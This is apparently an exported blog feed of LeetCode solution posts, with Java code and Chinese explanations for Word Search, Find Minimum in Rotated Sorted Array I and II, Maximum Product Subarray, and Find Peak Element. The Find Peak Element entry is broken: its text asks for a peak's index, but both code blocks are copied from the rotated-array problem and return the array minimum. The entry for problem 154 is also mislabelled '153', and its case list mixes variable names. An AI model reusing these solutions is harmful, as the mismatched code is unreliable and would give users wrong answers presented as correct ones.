    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a 2D board and a word, find if the word exists in the grid.</p>
<p>The word can be constructed from letters of sequentially adjacent cell, where “adjacent” cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">board &#x3D;</span><br><span class="line">[</span><br><span class="line">  [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;E&#39;],</span><br><span class="line">  [&#39;S&#39;,&#39;F&#39;,&#39;C&#39;,&#39;S&#39;],</span><br><span class="line">  [&#39;A&#39;,&#39;D&#39;,&#39;E&#39;,&#39;E&#39;]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">Given word &#x3D; &quot;ABCCED&quot;, return true.</span><br><span class="line">Given word &#x3D; &quot;SEE&quot;, return true.</span><br><span class="line">Given word &#x3D; &quot;ABCB&quot;, return false.</span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li><code>board</code> and <code>word</code> consists only of lowercase and uppercase English letters.</li>
<li><code>1 &lt;= board.length &lt;= 200</code></li>
<li><code>1 &lt;= board[i].length &lt;= 200</code></li>
<li><code>1 &lt;= word.length &lt;= 10^3</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>深度优先遍历</p>
<p>分解为以下步骤：</p>
<ol>
<li>遍历board中的每个字符，找到搜索起始点-即和word字符串第一个相等的char</li>
<li>对每个起始点，进行dfs搜索</li>
<li>如果搜索的时候，发现index已经等于word的长度了，则表示已经找到匹配的字符串了，直接返回</li>
<li>如果列或者行越界了，小于0或者大于列长度或者大于行长度，又或者当前的字符串和word对应位置的字符串不一致，说明当前路径是不可行的，直接返回</li>
<li>把当前节点置为一个特殊字符，表示已经使用，不可再用第二次，继续从当前节点的上下左右位置开始搜索</li>
<li>把当前节点置为原字符，供下次搜索使用</li>
</ol>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exist</span><span class="params">(<span class="keyword">char</span>[][] board, String word)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (board[i][j] == word.charAt(<span class="number">0</span>)) &#123;</span><br><span class="line">					<span class="keyword">if</span> (dfs(i, j, <span class="number">0</span>, board, word)) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">int</span> index, <span class="keyword">char</span>[][] board, String word)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (index == word.length()) &#123;</span><br><span class="line">			<span class="comment">// 当前所有的字符已经匹配上</span></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (row &lt; <span class="number">0</span> || row &gt;= board.length || col &lt; <span class="number">0</span> || col &gt;= board[<span class="number">0</span>].length</span><br><span class="line">				|| board[row][col] != word.charAt(index)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">char</span> c = board[row][col];</span><br><span class="line">		board[row][col] = <span class="string">'#'</span>;</span><br><span class="line">		<span class="keyword">boolean</span> result = dfs(row + <span class="number">1</span>, col, index + <span class="number">1</span>, board, word) || dfs(row - <span class="number">1</span>, col, index + <span class="number">1</span>, board, word)</span><br><span class="line">				|| dfs(row, col + <span class="number">1</span>, index + <span class="number">1</span>, board, word) || dfs(row, col - <span class="number">1</span>, index + <span class="number">1</span>, board, word);</span><br><span class="line">		board[row][col] = c;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>153. Find Minimum in Rotated Sorted Array</title>
    <url>/2020/03/24/LeetCode/leetcode-000153.-Find%20Minimum%20in%20Rotated%20Sorted%20Array/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p>
<p>(i.e.,  <code>[0,1,2,4,5,6,7]</code> might become  <code>[4,5,6,7,0,1,2]</code>).</p>
<p>Find the minimum element.</p>
<p>You may assume no duplicate exists in the array.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [3,4,5,1,2] </span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">Output: <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：库函数"><a href="#解法一：库函数" class="headerlink" title="解法一：库函数"></a>解法一：库函数</h3><p>排序，取第一个即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">    	<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：遍历"><a href="#解法二：遍历" class="headerlink" title="解法二：遍历"></a>解法二：遍历</h3><p>循环遍历，取最小的一个即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (min &gt; num) &#123;</span><br><span class="line">        		min = num;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：二分查找"><a href="#解法三：二分查找" class="headerlink" title="解法三：二分查找"></a>解法三：二分查找</h3><h4 id="JAVA-2"><a href="#JAVA-2" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = nums.length - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (nums[low] &lt; nums[high]) &#123;</span><br><span class="line">        	<span class="keyword">return</span> nums[low];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        	<span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">        	<span class="keyword">if</span> (nums[mid] &lt; nums[high]) &#123;</span><br><span class="line">        		<span class="comment">// mid 到 high 是递增的，说明最小元素在mid左侧，或者就是mid</span></span><br><span class="line">        		high = mid;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		low = mid + <span class="number">1</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> nums[low];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四：二分查找-递归"><a href="#解法四：二分查找-递归" class="headerlink" title="解法四：二分查找-递归"></a>解法四：二分查找-递归</h3><h4 id="JAVA-3"><a href="#JAVA-3" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> findMin(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (low == high) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[low];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (nums[mid] &lt; nums[high]) &#123;</span><br><span class="line">			<span class="comment">// mid 到 high 是递增的，说明最小元素在mid左侧，或者就是mid</span></span><br><span class="line">			<span class="keyword">return</span> findMin(nums, low, mid);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> findMin(nums, mid + <span class="number">1</span>, high);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五：二分查找变形"><a href="#解法五：二分查找变形" class="headerlink" title="解法五：二分查找变形"></a>解法五：二分查找变形</h3><p>通过二分查找的方法，找到这个数列的最大值。</p>
<p>因为这个数列是一个排序数列变形而来，那么紧跟在最大数字之后的数字，一定是最小的数字。</p>
<p>因此，求出最大数字的索引，加1返回即可。</p>
<p>注意一下，如果最大数字索引是数组长度-1的话，返回第一个元素的索引即可。</p>
<h4 id="JAVA-4"><a href="#JAVA-4" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> n = nums.length;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> b = n / <span class="number">2</span>; b &gt;= <span class="number">1</span>; b /= <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="keyword">while</span> (index + b &lt; n &amp;&amp; nums[index + b] &gt; nums[index]) &#123;</span><br><span class="line">				index += b;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (index == nums.length - <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[index + <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法六：分治法"><a href="#解法六：分治法" class="headerlink" title="解法六：分治法"></a>解法六：分治法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> findMin(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// One or two elements</span></span><br><span class="line">		<span class="keyword">if</span> (left + <span class="number">1</span> &gt;= right)</span><br><span class="line">			<span class="keyword">return</span> Math.min(nums[left], nums[right]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Sorted</span></span><br><span class="line">		<span class="keyword">if</span> (nums[left] &lt; nums[right])</span><br><span class="line">			<span class="keyword">return</span> nums[left];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// to find the solution recursively</span></span><br><span class="line">		<span class="keyword">return</span> Math.min(findMin(nums, left, mid - <span class="number">1</span>), findMin(nums, mid, right));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>152. Maximum Product Subarray</title>
    <url>/2020/03/24/LeetCode/leetcode-000152.-Maximum-Product-Subarray/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an integer array <code>nums</code>, find the contiguous subarray within an array (containing at least one number) which has the largest product.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [2,3,-2,4]</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: [2,3] has the largest product 6.</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [-<span class="number">2</span>,<span class="number">0</span>,-<span class="number">1</span>]</span><br><span class="line">Output: <span class="number">0</span></span><br><span class="line">Explanation: The result cannot be <span class="number">2</span>, because [-<span class="number">2</span>,-<span class="number">1</span>] is not a subarray.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>动态规划</p>
<p>从题目意思来看，它需要求出，连续的子序列的积。那么，假设d[i]为数组第i个数字时的最大乘积。那么它的最大值就是当前值（前一个值为0或者前一个值为负，当前值为正）或者它前一个最大值乘以当前值（前一个值和当前值都为正数）或者它前一个最小值乘以当前值（前一个值为负，当前值为负）</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProduct</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> min = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> max = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	<span class="keyword">int</span> m1 = min;</span><br><span class="line">        	<span class="keyword">int</span> m2 = max;</span><br><span class="line">        	min = Math.min(m1 * nums[i], Math.min(m2 * nums[i], nums[i]));</span><br><span class="line">        	max = Math.max(m1 * nums[i], Math.max(m2 * nums[i], nums[i]));</span><br><span class="line">        	result = Math.max(result, max);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>153. Find Minimum in Rotated Sorted Array II</title>
    <url>/2020/03/24/LeetCode/leetcode-000154.-Find%20Minimum%20in%20Rotated%20Sorted%20Array%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p>
<p>(i.e.,  <code>[0,1,2,4,5,6,7]</code> might become  <code>[4,5,6,7,0,1,2]</code>).</p>
<p>Find the minimum element.</p>
<p>The array may contain duplicates.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [1,3,5]</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">Output: <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="Note："><a href="#Note：" class="headerlink" title="Note："></a>Note：</h2><ul>
<li>This is a follow up problem to <a href="https://leetcode.com/problems/find-minimum-in-rotated-sorted-array/description/" target="_blank" rel="noopener">Find Minimum in Rotated Sorted Array</a>.</li>
<li>Would allow duplicates affect the run-time complexity? How and why?</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：库函数"><a href="#解法一：库函数" class="headerlink" title="解法一：库函数"></a>解法一：库函数</h3><p>排序，取第一个即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">    	<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：遍历"><a href="#解法二：遍历" class="headerlink" title="解法二：遍历"></a>解法二：遍历</h3><p>循环遍历，取最小的一个即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (min &gt; num) &#123;</span><br><span class="line">        		min = num;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：找到最大值和最小值的交界"><a href="#解法三：找到最大值和最小值的交界" class="headerlink" title="解法三：找到最大值和最小值的交界"></a>解法三：找到最大值和最小值的交界</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (;i &lt; nums.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[i + <span class="number">1</span>] &lt; nums[i]) &#123;</span><br><span class="line">				<span class="keyword">return</span> nums[i + <span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (i == nums.length - <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四：二分查找"><a href="#解法四：二分查找" class="headerlink" title="解法四：二分查找"></a>解法四：二分查找</h3><p>这块就不能用题目153的二分查找了。要稍微变形以下。</p>
<p>之前在使用二分查找的时候定义了三个值，low，mid，high。对应的nums数组中数字的关系，总共有6种，A3！。</p>
<p>分别是：</p>
<ul>
<li>nums[low] &lt;= nums[mid] &lt;= nums[tail]</li>
<li>nums[mid] &lt;= nums[tail] &lt;= nums[low]</li>
<li>nums[tail] &lt;= nums[low] &lt;= nums[mid]</li>
</ul>
<p>根据题目规则，已排序数组旋转，以下三种是不可能的情况：</p>
<ul>
<li>nums[head] &lt;= nums[tail] &lt;= nums[mid]</li>
<li>nums[mid] &lt;= nums[head] &lt;= nums[tail]</li>
<li>nums[tail] &lt;= nums[mid] &lt;= nums[head]</li>
</ul>
<h4 id="JAVA-2"><a href="#JAVA-2" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> high = nums.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">			<span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">if</span> (low == mid || high == mid) &#123;</span><br><span class="line">				<span class="keyword">return</span> Math.min(nums[low], Math.min(nums[mid], nums[high]));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (nums[low] &lt;= nums[mid] &amp;&amp; nums[mid] &lt;= nums[high]) &#123;</span><br><span class="line">				<span class="comment">// 单调递增数列</span></span><br><span class="line">				<span class="comment">// 1,1,2,3,4,5,5</span></span><br><span class="line">				high--;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt;= nums[high] &amp;&amp; nums[high] &lt;= nums[low]) &#123;</span><br><span class="line">				<span class="comment">// 后半段递增</span></span><br><span class="line">				<span class="comment">// 3,3,1,1,2,2</span></span><br><span class="line">				high = mid;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[high] &lt;= nums[low] &amp;&amp; nums[low] &lt;= nums[mid]) &#123;</span><br><span class="line">				<span class="comment">// 前半段递增</span></span><br><span class="line">				<span class="comment">// 2,2,3,4,5,1</span></span><br><span class="line">				low = mid;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五：递归"><a href="#解法五：递归" class="headerlink" title="解法五：递归"></a>解法五：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> findMin(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[l];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (nums[mid] &lt; nums[r]) &#123;</span><br><span class="line">			<span class="comment">// 后半段递增，则最小值在mid上或者mid左边</span></span><br><span class="line">			<span class="keyword">return</span> findMin(nums, l, mid);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; nums[r]) &#123;</span><br><span class="line">			<span class="comment">// 前半段递增</span></span><br><span class="line">			<span class="keyword">return</span> findMin(nums, mid + <span class="number">1</span>, r);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">int</span> le = findMin(nums, l, mid);</span><br><span class="line">			<span class="keyword">int</span> ri = findMin(nums, mid + <span class="number">1</span>, r);</span><br><span class="line">			<span class="keyword">return</span> Math.min(le, ri);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>162. Find Peak Element</title>
    <url>/2020/03/24/LeetCode/leetcode-000162.%20Find%20Peak%20Element/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>A peak element is an element that is greater than its neighbors.</p>
<p>Given an input array <code>nums</code>, where <code>nums[i] ≠ nums[i+1]</code>, find a peak element and return its index.</p>
<p>The array may contain multiple peaks, in that case return the index to any one of the peaks is fine.</p>
<p>You may imagine that <code>nums[-1] = nums[n] = -∞</code>.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums &#x3D; [1,2,3,1]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: 3 is a peak element and your function should return the index number 2.</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">Output: <span class="number">1</span> or <span class="number">5</span> </span><br><span class="line">Explanation: Your function can <span class="keyword">return</span> either index number <span class="number">1</span> where the peak element is <span class="number">2</span>, or index number <span class="number">5</span> where the peak element is <span class="number">6</span>.</span><br></pre></td></tr></table></figure>

<h2 id="Note："><a href="#Note：" class="headerlink" title="Note："></a>Note：</h2><ul>
<li>Your solution should be in logarithmic complexity.</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：遍历"><a href="#解法一：遍历" class="headerlink" title="解法一：遍历"></a>解法一：遍历</h3><p>找到第一个左边元素比它小，右边元素比它小的数字的索引即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">    	<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：遍历"><a href="#解法二：遍历" class="headerlink" title="解法二：遍历"></a>解法二：遍历</h3><p>循环遍历，取最小的一个即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (min &gt; num) &#123;</span><br><span class="line">        		min = num;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

